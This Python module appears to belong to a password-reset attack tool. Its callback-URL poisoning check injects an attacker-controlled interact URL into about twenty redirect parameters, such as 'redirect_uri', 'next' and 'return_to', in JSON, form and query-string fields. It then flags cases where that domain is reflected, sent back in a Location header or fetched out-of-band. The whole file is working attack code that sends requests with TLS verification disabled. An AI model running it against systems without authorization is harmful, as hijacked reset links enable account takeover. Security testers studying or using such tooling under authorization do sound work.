#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True

import json as _json
import urllib.parse
from utils.style import Colors
from utils.utils import requests, get_domain_from_url, CANARY
from utils import live


REDIRECT_PARAMS = [
    "redirect_uri", "redirect_url", "redirect", "next", "return_to",
    "returnTo", "return_url", "returnUrl", "callback", "callback_url",
    "callbackUrl", "success_url", "successUrl", "continue", "destination",
    "goto", "url", "link", "target", "forward",
]


def _inject_json(body, param, value):
    try:
        data = _json.loads(body)
        if not isinstance(data, dict):
            return None
        # GraphQL: also try as variable
        if "query" in data and isinstance(data.get("variables"), dict):
            copy = _json.loads(body)
            copy["variables"][param] = value
            return _json.dumps(copy)
        data[param] = value
        return _json.dumps(data)
    except Exception:
        return None


def _inject_form(body, param, value):
    try:
        parsed = urllib.parse.parse_qs(body or "", keep_blank_values=True)
        parsed[param] = [value]
        return urllib.parse.urlencode(parsed, doseq=True)
    except Exception:
        return None


def _check_resp(resp, attacker_domain, interact, proxies, tag):
    findings = []
    if attacker_domain in resp.text:
        findings.append(f"[HIGH] {attacker_domain} reflected in body → {tag}")
    loc = resp.headers.get("Location", "")
    if attacker_domain in loc:
        findings.append(f"[CRITICAL] {attacker_domain} in Location redirect → {tag}: {loc[:100]}")
    elif attacker_domain in str(resp.headers):
        findings.append(f"[HIGH] {attacker_domain} in response headers → {tag}")
    if interact:
        try:
            oob = requests.get(interact, verify=False, allow_redirects=False,
                               timeout=5, proxies=proxies)
            if oob.status_code == 200 and (attacker_domain in oob.text or CANARY in oob.text):
                findings.append(
                    f"[CRITICAL] OOB callback on interact server → server fetched attacker "
                    f"domain via {tag}"
                )
        except requests.RequestException:
            pass
    return findings


def callback_url(url, parsed_req, baseline, interact, email, proxy=None):
    """
    Callback URL / redirect URI poisoning.
    Inject redirect params in body and URL query string to hijack the reset link destination.
    Requires -i (interact URL) for OOB detection.
    """
    print(f"{Colors.CYAN} ├ Callback URL poisoning{Colors.RESET}")

    if not interact:
        print(f"  {Colors.YELLOW}[!] -i/--interact required for OOB detection{Colors.RESET}")
        return

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"
    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    attacker_url = interact
    attacker_domain = get_domain_from_url(interact)

    ct = ""
    for k, v in headers.items():
        if k.lower() == "content-type":
            ct = v.lower()
    is_json = "application/json" in ct

    all_findings = []
    tested = 0

    print(f"{Colors.CYAN} └─ Injecting {len(REDIRECT_PARAMS)} redirect params (body + QS){Colors.RESET}")

    for param in REDIRECT_PARAMS:
        live.testing(f"callback-url {param}")
        # Body injection
        if body:
            modified_body = _inject_json(body, param, attacker_url) if is_json \
                else _inject_form(body, param, attacker_url)

            if modified_body and modified_body != body:
                try:
                    resp = requests.request(
                        method=method, url=uri, headers=headers,
                        data=modified_body, verify=False, allow_redirects=False,
                        timeout=10, proxies=proxies,
                    )
                    tested += 1
                    for f in _check_resp(resp, attacker_domain, interact, proxies, f"body:{param}"):
                        print(f"{Colors.RED}   └── {f}{Colors.RESET}")
                        all_findings.append(f)
                except requests.RequestException:
                    pass

        # Query-string injection
        sep = "&" if "?" in uri else "?"
        qs_uri = f"{uri}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(attacker_url)}"
        try:
            resp = requests.request(
                method=method, url=qs_uri, headers=headers,
                data=body or None, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )
            tested += 1
            for f in _check_resp(resp, attacker_domain, interact, proxies, f"QS:{param}"):
                print(f"{Colors.RED}   └── {f}{Colors.RESET}")
                all_findings.append(f)
        except requests.RequestException:
            pass

    if not all_findings:
        print(f"{Colors.GREEN}   └── [-] No callback URL poisoning detected ({tested} payloads){Colors.RESET}")
